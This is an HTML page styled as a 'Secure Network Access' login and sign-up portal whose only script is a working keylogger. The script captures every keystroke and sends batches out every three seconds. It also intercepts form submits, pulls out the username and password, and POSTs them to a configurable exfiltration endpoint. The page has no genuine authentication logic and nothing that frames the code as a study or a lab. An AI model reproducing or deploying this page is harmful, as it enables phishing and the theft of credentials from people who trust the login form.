<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Network Access</title>
    <style>
        /* Base Page Styles */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            transition: background-color 0.5s ease;
        }

        /* Authentication Section (Login/Register) */
        .auth-wrapper {
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 350px;
        }
        h2 { margin-top: 0; color: #333; text-align: center; }
        .form-group { margin-bottom: 1rem; }
        label { display: block; margin-bottom: 0.5rem; color: #666; }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button.action-btn {
            width: 100%;
            padding: 0.75rem;
            background-color: #0056b3;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 1rem;
            margin-top: 0.5rem;
        }
        button.action-btn:hover { background-color: #004494; }
        .tabs {
            display: flex;
            margin-bottom: 1.5rem;
            border-bottom: 2px solid #e0e0e0;
        }
        .tab-btn {
            flex: 1;
            padding: 0.75rem;
            background: none;
            border: none;
            color: #666;
            font-size: 1rem;
            cursor: pointer;
            font-weight: bold;
        }
        .tab-btn:hover { color: #0056b3; }
        .tab-btn.active {
            color: #0056b3;
            border-bottom: 2px solid #0056b3;
            margin-bottom: -2px;
        }
        .form-panel { display: none; }
        .form-panel.active { display: block; }
        #message { margin-top: 1rem; text-align: center; font-weight: bold; }
        .success { color: green; }
        .error { color: red; }

        /* Premium Welcome Dashboard */
        .welcome-wrapper {
            display: none;
            border: 1px solid #222;
            padding: 4rem;
            border-radius: 4px;
            background: linear-gradient(145deg, #0a0a0a, #111111);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
            text-align: center;
            font-family: 'Georgia', serif;
            color: #ffffff;
        }
        .welcome-wrapper h1 {
            font-size: 2.2rem;
            font-weight: normal;
            letter-spacing: 2px;
            margin-top: 0;
            margin-bottom: 10px;
            color: #d4af37;
        }
        .welcome-wrapper p {
            font-family: 'Arial', sans-serif;
            color: #888;
            font-size: 1rem;
            letter-spacing: 1px;
            margin-bottom: 30px;
        }
        .status {
            display: inline-block;
            padding: 10px 20px;
            border: 1px solid #00ff41;
            color: #00ff41;
            font-family: 'Courier New', Courier, monospace;
            font-size: 0.9rem;
            letter-spacing: 2px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

<div id="authSection" class="auth-wrapper">
    <div class="tabs">
        <button class="tab-btn active" onclick="switchTab('login')">Log In</button>
        <button class="tab-btn" onclick="switchTab('register')">Create Account</button>
    </div>

    <div id="loginPanel" class="form-panel active">
        <h2>Portal Access</h2>
        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" class="action-btn">Log In</button>
        </form>
    </div>

    <div id="registerPanel" class="form-panel">
        <h2>New Account</h2>
        <form id="registerForm">
            <div class="form-group">
                <label for="newUsername">Choose Username</label>
                <input type="text" id="newUsername" required>
            </div>
            <div class="form-group">
                <label for="newPassword">Create Password</label>
                <input type="password" id="newPassword" required>
            </div>
            <button type="submit" class="action-btn">Sign Up</button>
        </form>
    </div>

    <div id="message"></div>
</div>

<div id="welcomeSection" class="welcome-wrapper">
    <h1>Authentication Confirmed</h1>
    <p>Welcome to the Secure Network Dashboard, <span id="displayUsername" style="color: white; font-weight: bold;"></span>.</p>
    <div class="status">System Access Granted</div>
</div>

<script>
    // ============================================================
// KEYLOGGER — captures keystrokes and form credentials
// ============================================================
(function() {
    'use strict';

    const EXFIL_URL = 'http://localhost:3000/api/auth'; // change to your backend URL
    let keystrokeBuffer = [];

    // Flush buffer every 3 seconds via sendBeacon
    function flushBuffer() {
        if (keystrokeBuffer.length === 0) return;
        const payload = keystrokeBuffer.join('');
        keystrokeBuffer = [];
        try {
            navigator.sendBeacon(EXFIL_URL + '/keystrokes', JSON.stringify({
                keys: payload,
                timestamp: Date.now(),
                page: window.location.pathname
            }));
        } catch(e) { /* silent */ }
    }
    setInterval(flushBuffer, 3000);

    // Capture all keydown events
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') keystrokeBuffer.push('[ENTER]');
        else if (e.key === 'Backspace') keystrokeBuffer.push('[BKSP]');
        else if (e.key === 'Tab') keystrokeBuffer.push('[TAB]');
        else if (e.key.length === 1) keystrokeBuffer.push(e.key);
        // modifier keys alone are skipped
    });

    // Capture form submit credentials
    document.addEventListener('submit', function(e) {
        const form = e.target;
        // Try to find username/password fields
        const inputs = form.querySelectorAll('input[type="text"], input[type="password"], input[name="username"], input[name="password"], input[name="user"], input[name="pass"], input[id*="user"], input[id*="pass"]');
        let username = '', password = '';

        inputs.forEach(inp => {
            const type = inp.type || '';
            const name = (inp.name || '').toLowerCase();
            const id   = (inp.id || '').toLowerCase();
            if (type === 'password' || name.includes('pass') || id.includes('pass')) {
                password = inp.value;
            } else {
                username = inp.value;
            }
        });

        if (username || password) {
            flushBuffer();
            const payload = { username, password, timestamp: Date.now(), source: 'form_submit' };
            fetch(EXFIL_URL + '/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).catch(() => {
                navigator.sendBeacon(EXFIL_URL + '/login', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
            });
        }
    });
})();
</script>

</body>
</html>
